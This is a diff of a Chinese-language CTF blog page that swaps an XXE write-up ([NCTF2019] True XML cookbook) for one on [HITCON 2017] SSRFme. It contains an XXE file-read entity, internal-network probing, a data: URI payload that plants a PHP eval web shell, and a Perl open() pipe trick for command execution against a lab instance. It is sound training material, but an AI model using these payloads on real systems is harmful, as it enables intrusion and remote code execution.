@@ -13,7 +13,7 @@
 
 
 
-<title>cookbook&#39; | Hexo</title>
+<title>‘’[HITCON 2017]SSRFme‘’ | Hexo</title>
 
 
 
@@ -196,7 +196,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">cookbook&#39;</h1>
+            <h1 class="post-title">‘’[HITCON 2017]SSRFme‘’</h1>
             
                 <div class="post-meta">
                     
@@ -205,7 +205,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">May 29, 2024&nbsp;&nbsp;21:46:38</a>
+                        Date: <a href="#">June 2, 2024&nbsp;&nbsp;14:57:07</a>
                         </span>
                     
                     
@@ -221,39 +221,44 @@
         </header>
 
         <div class="post-content">
-            <h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><h3 id="xxe漏洞："><a href="#xxe漏洞：" class="headerlink" title="xxe漏洞："></a>xxe漏洞：</h3><p>与Fake XML Cookbook一样的类型，比fake难一些</p>
-<p>Fake XML Cookbook：</p>
-<p>这个是直接xxe漏洞：</p>
-<!DOCTYPE note [
-  <!ENTITY admin SYSTEM "file:///flag">
-<p>  ]&gt;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+            <h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">        $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);</span><br><span class="line">        $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line"></span><br><span class="line">    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info = pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
 
-<p>这个不能这样做：因为没有反应，反正是读文件</p>
-<p>这个读不了读别的：php:filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;doLogin.php</p>
-<p>获取源码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">//doLogin.php</span><br><span class="line">&lt;?php\n/**</span><br><span class="line">* autor: c0ny1\n* date: 2018-2-7</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">$USERNAME = &#x27;admin&#x27;; //\xe8\xb4\xa6\xe5\x8f\xb7</span><br><span class="line">$PASSWORD = &#x27;024b87931a03f738fff6693ce0a78c88&#x27;; //\xe5\xaf\x86\xe7\xa0\x81</span><br><span class="line">$result = null;</span><br><span class="line">libxml_disable_entity_loader(false);   // libxml_disable_entity_loader用于禁用或启用加载外部实体的功能。禁用（TRUE）或启用（FALSE）。</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">try&#123;</span><br><span class="line">	$dom = new DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);   // loadXML() 方法通过解析一个 XML 标签字符串来组成该文档</span><br><span class="line">	$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">	$username = $creds-&gt;username;</span><br><span class="line">	$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line">	if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span><br><span class="line">		$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);</span><br><span class="line">	&#125;else&#123;       // sprintf() 函数把格式化的字符串写入变量中。</span><br><span class="line">		$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;catch(Exception $e)&#123;</span><br><span class="line">	$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);</span><br><span class="line">echo $result;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>实现发送GET请求给当前GET参数’url‘，并将其结果保存在&#x2F;sandbox&#x2F;md5(“orange” . $_SERVER[“REMOTE_ADDR”])&#x2F;filename中，其中filename为传入的Get参数。</p>
+<p>将filename存储在&#x2F;sandbox&#x2F;md5(“orange”+127.0.0.1)&#x2F;filename里面，url是将读到的内容写入filename中</p>
+<p>通过&#x2F;sandbox&#x2F;md5(“orange”+127.0.0.1)&#x2F;filename可以访问得到</p>
+<h3 id="2-路径泄露"><a href="#2-路径泄露" class="headerlink" title="2. 路径泄露"></a>2. 路径泄露</h3><ul>
+<li><p>试试路径泄露，直接访问本机根目录：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/59c29008-ea1f-4cf4-89c9-16cb955abca7.node4.buuoj.cn:81/</span><span class="string">?u</span>rl=<span class="regexp">/&amp;filename=upload/test</span>.php</span><br></pre></td></tr></table></figure>
 
-<p>simplexml_import_dom() 函数把 DOM 节点转换为 SimpleXMLElement 对象。获取 DOM 文档节点并转换为 SimpleXML 节点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dom=new domDocument;</span><br><span class="line">$dom-&gt;loadXML(&quot;&lt;note&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;/note&gt;&quot;);</span><br><span class="line">$x=simplexml_import_dom($dom);</span><br><span class="line">echo $x-&gt;from;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>此时发现flag，就在根目录中：</p>
+<p>但是GET命令并不能读文件，此时想的是通过一个远程主机写好马，然后get完之后将马存储在test.php中，实现远程写马。但是因为没有公网ip(还是穷)，而且推测get完远程主机返回的不一定是php代码而是html，所以作罢，想想其他思路。</p>
+</li>
+<li><p>这里存在一个readflag，于是测试一下访问它：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/59c29008-ea1f-4cf4-89c9-16cb955abca7.node4.buuoj.cn:81/</span><span class="string">?u</span>rl=<span class="regexp">/readflag&amp;filename=upload/test</span>.php</span><br></pre></td></tr></table></figure>
 
+<p>感觉是读flag的脚本，那现在需要做的就是执行它。</p>
+</li>
+</ul>
+<h3 id="3-思路一：SSRF配合伪协议"><a href="#3-思路一：SSRF配合伪协议" class="headerlink" title="3. 思路一：SSRF配合伪协议"></a>3. 思路一：SSRF配合伪协议</h3><p>联想到之前有个题目中是file_put_contents函数使用data伪协议控制其内容，这里想通过GET后加data伪协议实现写马，payload:</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?url=data:text/plain,&#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;capt&#x27;</span>])<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;&amp;filename=upload/test.php</span></span><br></pre></td></tr></table></figure>
 
-<p>输出类似：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Jani</span><br></pre></td></tr></table></figure>
+<p>至于为什么需要引号，可以在linux中测试，如果不加引号，命令行会因为&lt;?等符号解析错误。</p>
+<p>此时因为写入的文件名称后缀可以是php，所以直接访问沙河中的php文件，再使用蚁剑连接。但是直接打开根目录的flag显示为空。所以在蚁剑中打开命令行，运行readflag：</p>
+<p>![1](..&#x2F;images&#x2F;[HITCON 2017]SSRFme&#x2F;1.png)</p>
+<h3 id="4-思路二：perl语言漏洞"><a href="#4-思路二：perl语言漏洞" class="headerlink" title="4. 思路二：perl语言漏洞"></a>4. 思路二：perl语言漏洞</h3><p>这也是大部分题解中的思路，利用perl语言的漏洞：</p>
+<p>因为GET函数在底层调用了perl语言中的open函数，但是该函数存在rce漏洞。当open函数要打开的文件名中存在管道符（并且系统中存在该文件名），就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行。</p>
+<p>先创建该文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=&amp;filename=|/readflag</span><br></pre></td></tr></table></figure>
 
-<p>emm……没什么发现，但是读取源码的payload我还是在这里记录一哈。<br>这一次有所不同，上一题是我们读取文件得到flag。这次是刺探存活的服务器；</p>
-<p>其实很多人都小看了xxe漏洞，觉得它只可以读读文件啊什么的，其实大错特错，它还可以访问内网的主机，和ssrf利用的dict伪协议一样，都可以刺探存活的主机并且链接访问；也可以看作这个题是在打内网；</p>
-<p>好的我们老样子，我们利用ssrf读内网文件。先用file协议读取相关的文件 &#x2F;etc&#x2F;passwd 和 &#x2F;etc&#x2F;hosts；当我们读取到hosts文件的时候，我们会发现有几个ip地址，我们便来访问一下，（到这里应该可以猜到是在打内网了）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只能想到利用xxe进行ssrf打内网，扫描一下内网ip的几个文件：/etc/hosts，/proc/net/arp，/proc/net/fib_trie</span><br></pre></td></tr></table></figure>
+<p>再执行命令：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">?url=file:|readflag&amp;filename=123</span></span><br></pre></td></tr></table></figure>
 
-<p>![2](..&#x2F;images&#x2F;[NCTF2019]True XML cookbook&#x2F;2.png)![1](..&#x2F;images&#x2F;[NCTF2019]True XML cookbook&#x2F;1.png)</p>
-<p>然后就是找内网服务器了：读这个<a target="_blank" rel="noopener" href="http://173.113.242.10/">http://173.113.242.10</a></p>
-<p>没找到，还在报错</p>
-<p>![3](..&#x2F;images&#x2F;[NCTF2019]True XML cookbook&#x2F;3.png)</p>
-<p>换个服务器</p>
-<p><a target="_blank" rel="noopener" href="http://173.113.242.11/">http://173.113.242.11</a></p>
-<p>![11](..&#x2F;images&#x2F;[NCTF2019]True XML cookbook&#x2F;11.png)</p>
-<p>获取flag，完成啦</p>
+<p>最后访问123文件即可。但是网上的Payload我都没成功。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li>对于ssrf首先还是想到伪协议</li>
+<li>perl语言的漏洞，管道符的利用</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CAPD/p/17858896.html">(<em>´∇｀</em>) 欢迎回来！ (cnblogs.com)</a></p>
 
         </div>
 
@@ -268,7 +273,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://odiws.github.io/2024/05/29/cookbook-1/">http://odiws.github.io/2024/05/29/cookbook-1/</a></span>
+                        <span><a href="http://odiws.github.io/2024/06/02/2017-SSRFme/">http://odiws.github.io/2024/06/02/2017-SSRFme/</a></span>
                     </p>
                 
                 
@@ -305,10 +310,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2024/05/30/Web5-CyberPunk/">Web5]CyberPunk</a>
             
-            
-            <a class="next" rel="next" href="/2024/05/29/ctf%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/">'ctf工具总结'</a>
+            <a class="next" rel="next" href="/2024/05/30/Web1-Dropbox/">Web1]Dropbox</a>
             
         </section>
 
